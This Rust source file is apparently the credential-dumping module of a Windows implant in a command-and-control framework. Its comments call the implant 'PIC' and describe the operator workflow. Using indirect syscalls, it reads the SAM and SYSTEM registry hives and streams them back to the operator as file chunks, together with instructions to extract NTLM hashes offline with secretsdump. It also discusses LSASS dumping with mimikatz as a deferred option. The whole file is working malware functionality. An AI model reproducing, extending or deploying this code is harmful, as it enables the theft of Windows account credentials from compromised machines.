//! Credential extraction (Hashdump) for the Windows PIC implant.
//!
//! Implements `Command::Hashdump { method }`:
//!   - method 0: read the raw SAM registry hive (`\SystemRoot\System32\config\SAM`)
//!     plus the matching SYSTEM hive (needed to derive the boot key), and
//!     stream both back as `FileChunk`s. The hives are encrypted at rest; the
//!     *decryption + NTLM hash parsing* is intentionally NOT done in-implant —
//!     it belongs offline (secretsdump/impacket-style), where the operator has
//!     the full Python toolchain and isn't burning implant time on a multi-step
//!     crypto dance that also balloons the binary.
//!   - method 1: read the on-disk SYSTEM hive (the boot-key source) on its own.
//!
//! LSASS memory dumping (`procdump`-style mini-dump of lsass.exe then offline
//! mimikatz) is a separate, much riskier path (needs SeDebugPrivilege + a handle
//! to a protected process) and is explicitly deferred — it's the loudest possible
//! credential op and deserves its own design doc.
//!
//! Reading the SAM file needs SYSTEM privileges (the file ACL denies even
//! Administrators by default). The implant will only succeed if it's running as
//! SYSTEM (e.g. via a service context). We surface the access-denied NTSTATUS
//! honestly rather than faking success.

#![cfg(target_os = "windows")]

use crate::heap::{vec, String, Vec};
use crate::syscalls::Runtime;
use nyx_protocol::Response;

/// Per-chunk size for streamed hive reads. Matches fs.rs CHUNK.
const CHUNK: usize = 128 * 1024;

/// Read a whole file via the indirect-syscall runtime as a streamed list of
/// `FileChunk`s. Returns Err on open/read failure.
///
/// **Critical**: hive files (SAM/SYSTEM) are held under an exclusive oplock by
/// the SAM/LSASS services. A *synchronous* NtCreateFile on such a file HANGS
/// (it waits for the oplock to break, which never happens) — that would brick
/// the beacon loop forever. So we first PROBE the file with a NON-synchronous
/// open + minimal sharing: that returns immediately with STATUS_SHARING_
/// VIOLATION / STATUS_ACCESS_DENIED on a locked/unreadable hive, which we
/// surface as an honest Err. Only if the probe succeeds (we're SYSTEM + the
/// hive is readable) do we proceed to the real streaming read.
unsafe fn stream_file(rt: &Runtime, host_path: &str, chunk_name: &str) -> Vec<Response> {
    // Probe: non-sync open, GENERIC_READ, FILE_SHARE_READ only. If the hive is
    // locked (live system) or we lack access (non-SYSTEM), this returns a
    // failing status immediately — no hang.
    const STATUS_SHARING_VIOLATION: i32 = 0xC000_0043_u32 as i32;
    const STATUS_ACCESS_DENIED: i32 = 0xC000_0022_u32 as i32;
    let probe = unsafe {
        crate::fs::open_file_nosync(
            rt,
            host_path,
            crate::fs::GENERIC_READ,
            crate::fs::FILE_OPEN,
            crate::fs::FILE_NON_DIRECTORY_FILE,
            crate::fs::FILE_SHARE_READ,
        )
    };
    let mut note_prefix: Option<String> = None;
    match probe {
        Ok(handle) => {
            // File is readable — close the probe and do the real streaming read
            // (do_download re-opens synchronously, which is now safe because the
            // oplock isn't blocking us).
            let _ = crate::syscalls::nt_close(rt, handle as usize);
        }
        Err(crate::fs::OpenError::Status(s)) => {
            // Expected on a live non-SYSTEM implant: hive locked / access denied.
            let why = if s == STATUS_SHARING_VIOLATION {
                "hive locked by SAM service"
            } else if s == STATUS_ACCESS_DENIED {
                "access denied (need SYSTEM)"
            } else {
                "open failed"
            };
            let mut e = String::from("hashdump: ");
            e.push_str(chunk_name);
            e.push_str(": ");
            e.push_str(why);
            return vec![Response::Err(e)];
        }
        Err(crate::fs::OpenError::Unresolved) => {
            return vec![Response::Err(String::from(
                "hashdump: syscall runtime unresolved",
            ))];
        }
        Err(crate::fs::OpenError::BadPath) => {
            return vec![Response::Err(String::from("hashdump: bad path"))];
        }
    }
    let _ = note_prefix;

    // Real read path (the probe confirmed it's safe to open synchronously).
    let mut chunks = crate::fs::do_download(rt, host_path);
    let new_name = String::from(chunk_name);
    for c in chunks.iter_mut() {
        if let Response::FileChunk { name, .. } = c {
            *name = new_name.clone();
        }
    }
    chunks
}

/// Handle `Command::Hashdump { method }`.
///
/// - 0 (SAM): stream the SAM hive (encrypted) + a note that the SYSTEM hive
///   is the boot-key source the operator needs offline.
/// - 1 (SYSTEM): stream the SYSTEM hive (boot-key source) on its own.
pub fn do_hashdump(rt: Option<&'static Runtime>, method: u8) -> Response {
    let rt = match rt {
        Some(r) => r,
        None => return Response::Err(String::from("hashdump: syscall runtime down")),
    };
    // Resolve %SystemRoot% so we don't hardcode C:\Windows.
    let sysroot = system_root();
    let mut out: Vec<Response> = Vec::new();
    match method {
        0 => {
            // SAM hive (encrypted at rest). Needs SYSTEM context.
            let sam = format_path(&sysroot, r"\System32\config\SAM");
            let mut sam_chunks = unsafe { stream_file(rt, &sam, "SAM") };
            out.append(&mut sam_chunks);
            // Append a plaintext marker chunk telling the operator the SYSTEM
            // hive is the boot-key source — keeps the offline workflow obvious.
            let note = String::from(
                "NOTE: SAM hive is encrypted. Run hashdump method=1 for the SYSTEM\n\
                 hive (boot-key source), then decrypt+parse offline (secretsdump).\n",
            );
            out.push(Response::Output(note.into_bytes()));
        }
        1 => {
            let sys = format_path(&sysroot, r"\System32\config\SYSTEM");
            let mut sys_chunks = unsafe { stream_file(rt, &sys, "SYSTEM") };
            out.append(&mut sys_chunks);
        }
        other => {
            return Response::Err({
                let mut e = String::from("hashdump: unknown method ");
                push_decimal(&mut e, other as u32);
                e
            });
        }
    }
    // A Vec of multiple responses — but execute() expects one Response. The
    // beacon loop's execute() returns Vec<Response>, but the Hashdump arm in
    // beacon.rs currently wraps a single Response in vec![]. To return multiple,
    // beacon.rs must call do_hashdump_vec instead. We expose both: this single-
    // Response variant concatenates into one Output (loses the FileChunk
    // streaming benefit) for callers that want one Response; the beacon uses the
    // _vec variant below.
    //
    // Collapse to a single Output for this signature's contract: join all chunk
    // data + any Output bytes into one buffer. (Streaming is preserved by the
    // _vec variant; this one is for parity with other single-Response commands.)
    let mut joined: Vec<u8> = Vec::new();
    for r in out {
        match r {
            Response::FileChunk { data, .. } | Response::Output(data) => {
                joined.extend_from_slice(&data);
            }
            Response::Err(s) => return Response::Err(s),
            _ => {}
        }
    }
    Response::Output(joined)
}

/// Multi-response variant: returns the streamed FileChunks directly (preserving
/// chunked framing for large hives). The beacon's Hashdump arm calls this.
pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response> {
    let rt = match rt {
        Some(r) => r,
        None => return vec![Response::Err(String::from("hashdump: syscall runtime down"))],
    };
    let sysroot = system_root();
    match method {
        0 => {
            let sam = format_path(&sysroot, r"\System32\config\SAM");
            let mut chunks = unsafe { stream_file(rt, &sam, "SAM") };
            chunks.push(Response::Output(
                String::from(
                    "NOTE: SAM hive is encrypted. Also dump the SYSTEM hive\n\
                     (hashdump method=1) for the boot key, then parse offline.\n",
                )
                .into_bytes(),
            ));
            chunks
        }
        1 => {
            let sys = format_path(&sysroot, r"\System32\config\SYSTEM");
            unsafe { stream_file(rt, &sys, "SYSTEM") }
        }
        other => {
            let mut e = String::from("hashdump: unknown method ");
            push_decimal(&mut e, other as u32);
            vec![Response::Err(e)]
        }
    }
}

/// Append `v` in decimal to `s` (no `format!`/`to_string` under no_std).
fn push_decimal(s: &mut String, mut v: u32) {
    if v == 0 {
        s.push('0');
        return;
    }
    let mut tmp = [0u8; 10];
    let mut i = tmp.len();
    while v != 0 {
        i -= 1;
        tmp[i] = b'0' + (v % 10) as u8;
        v /= 10;
    }
    // tmp[i..] is valid ASCII digits; push each as a char.
    for &b in &tmp[i..] {
        s.push(b as char);
    }
}

/// Resolve `%SystemRoot%` via the PEB-walked environment (kernel32). Falls back
/// to `C:\Windows` if unset (the overwhelming default).
fn system_root() -> String {
    // GetEnvironmentVariableW; reuse recon's resolution style inline (avoid a
    // cross-module dep just for one var).
    type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
    let gev: GetEnvVarW = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("C:\\Windows"),
    };
    let mut name16 = crate::heap::vec![0u16; 14];
    let nb = b"SystemRoot";
    for (i, &c) in nb.iter().enumerate() {
        name16[i] = c as u16;
    }
    name16[nb.len()] = 0;
    let mut buf = crate::heap::vec![0u16; 260];
    let n = unsafe { gev(name16.as_ptr(), buf.as_mut_ptr(), 260) };
    if n == 0 || n as usize >= 260 {
        return String::from("C:\\Windows");
    }
    // UTF-16 → lossy ASCII (SystemRoot is always ASCII on real installs).
    let mut out = String::new();
    for &w in &buf[..n as usize] {
        if w < 0x80 {
            out.push(w as u8 as char);
        } else {
            out.push('?');
        }
    }
    out
}

/// Join `<sysroot><suffix>` into one owned String.
fn format_path(sysroot: &str, suffix: &str) -> String {
    let mut s = String::with_capacity(sysroot.len() + suffix.len());
    s.push_str(sysroot);
    s.push_str(suffix);
    s
}
